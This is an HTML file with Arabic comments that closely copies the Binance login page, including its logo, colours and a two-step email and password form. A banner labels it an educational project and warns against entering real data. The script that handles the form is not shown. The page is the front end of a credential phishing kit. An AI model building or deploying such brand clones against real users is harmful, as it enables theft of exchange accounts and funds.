<!DOCTYPE html>
<html lang="en" dir="ltr" id="htmlRoot">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log In | Binance</title>
  <meta name="theme-color" content="#181A20" />
  
  <style>
    :root {
      --bg: #181a20;
      --bg-input: #1e2329;
      --line: #2b3139;
      --text: #eaecef;
      --muted: #848e9c;
      --yellow: #fcd535;
      --yellow-hover: #f0b90b;
      --danger: #f6465d;
    }

    * { box-sizing: border-box; }

    html, body {
      margin: 0;
      min-height: 100%;
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    }

    body {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      padding-top: 56px; /* مساحة للتنبيه الأمني */
    }

    /* التنبيه الأمني */
    .edu-notice {
      position: fixed;
      top: 0; left: 0; right: 0;
      z-index: 9999;
      background: var(--yellow);
      color: #111;
      text-align: center;
      padding: 10px 16px;
      font-size: 14px;
      font-weight: 700;
      box-shadow: 0 2px 8px rgba(0,0,0,0.25);
    }

    /* الحاوية الرئيسية */
    .main-container {
      flex: 1;
      display: flex;
      justify-content: center;
      padding: 24px 16px;
    }

    /* البطاقة (تتحول لشاشة كاملة على الهاتف) */
    .card {
      width: 100%;
      max-width: 400px;
      padding: 30px 0;
    }

    /* الشعار (محاذى لليسار) */
    .brand-row {
      display: flex;
      justify-content: flex-start;
      margin-bottom: 32px;
    }
    
    .brand-row svg {
      width: 120px;
      height: 24px;
    }

    /* العنوان (محاذى لليسار) */
    .title {
      font-size: 32px;
      font-weight: 600;
      margin: 0 0 24px 0;
      text-align: left;
    }

    /* الخطوات */
    .step { display: none; }
    .step.active { display: block; }

    /* زر الرجوع */
    .back-link {
      background: transparent;
      border: none;
      color: var(--muted);
      font-size: 14px;
      cursor: pointer;
      padding: 0;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .back-link:hover { color: var(--text); }

    /* الحقول (محاذاة لليسار) */
    .field {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-bottom: 20px;
    }

    .label {
      color: var(--text);
      font-size: 14px;
      text-align: left;
    }

    .input-shell {
      border: 1px solid var(--line);
      background: var(--bg-input);
      border-radius: 8px;
      transition: border-color 0.2s ease;
    }

    .input-shell:focus-within {
      border-color: var(--yellow);
    }

    .input-shell.error {
      border-color: var(--danger);
    }

    input {
      width: 100%;
      background: transparent;
      border: none;
      outline: none;
      color: var(--text);
      font-size: 16px;
      padding: 14px 16px;
    }

    input::placeholder { color: var(--muted); }

    /* رسائل الخطأ */
    .warning {
      display: none;
      color: var(--danger);
      font-size: 13px;
      margin-top: 4px;
      text-align: left;
    }
    .warning.show { display: block; }

    /* الزر الأساسي (أصفر) */
    .login-btn {
      width: 100%;
      border: none;
      border-radius: 8px;
      background: var(--yellow);
      color: #111827;
      font-weight: 600;
      font-size: 16px;
      padding: 14px;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.2s;
    }
    .login-btn:hover { background: var(--yellow-hover); }
    .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }

    /* التذييل (اللغة والخصوصية) */
    .footer {
      display: flex;
      justify-content: center;
      gap: 24px;
      padding: 24px;
      color: var(--muted);
      font-size: 13px;
      border-top: 1px solid var(--line);
      margin-top: auto;
    }
    .footer span { cursor: pointer; }
    .footer span:hover { color: var(--text); }

    /* على شاشات الهواتف: إزالة الزوايا والظل ليكون ممتداً */
    @media (max-width: 480px) {
      .main-container { padding: 16px 24px; }
      .card { padding: 0; }
      .title { font-size: 28px; }
      .footer { border-top: none; }
    }
  </style>
</head>
<body>
  <div class="edu-notice">
    ⚠️ مشروع تعليمي — غير تابع لـ Binance. لا تُدخل بيانات حقيقية.
  </div>

  <main class="main-container">
    <div class="card">
      
      <!-- الشعار -->
      <div class="brand-row">
        <svg viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg">
          <path fill="#FCD535" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path>
        </svg>
      </div>

      <h1 class="title" id="pageTitle">Log in</h1>

      <form id="loginForm" novalidate>
        <!-- الخطوة 1: إدخال الإيميل -->
        <div id="emailStep" class="step active">
          <div class="field">
            <label class="label" for="username" id="lblUsername">Email/Phone number</label>
            <div class="input-shell" id="inputShell">
              <input id="username" type="text" placeholder="Email/Phone (without country code)" autocomplete="username" />
            </div>
            <div class="warning" id="warningText">Please enter a valid email or phone number.</div>
          </div>
          <button type="submit" class="login-btn" id="btnContinue">Continue</button>
        </div>

        <!-- الخطوة 2: إدخال كلمة المرور -->
        <div id="passwordStep" class="step">
          <button type="button" class="back-link" id="backToEmailBtn">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
            <span id="lblBack">Back</span>
          </button>
          <div class="field">
            <label class="label" for="password" id="lblPassword">Password</label>
            <div class="input-shell" id="passwordShell">
              <input id="password" type="password" placeholder="Enter your password" autocomplete="current-password" />
            </div>
            <div class="warning" id="passwordWarning">Please enter your password.</div>
          </div>
          <button type="submit" class="login-btn" id="submitBtn">Log In</button>
        </div>
      </form>

    </div>
  </main>

  <!-- التذييل -->
  <footer class="footer">
    <span id="langToggleBtn">English</span>
    <span id="lblCookies">Cookies</span>
    <span id="lblPrivacy">Privacy</span>
  </footer>

  <!-- ربط ملف الجافاسكربت -->
  <script type="module" src="login.js"></script>
</body>
</html>
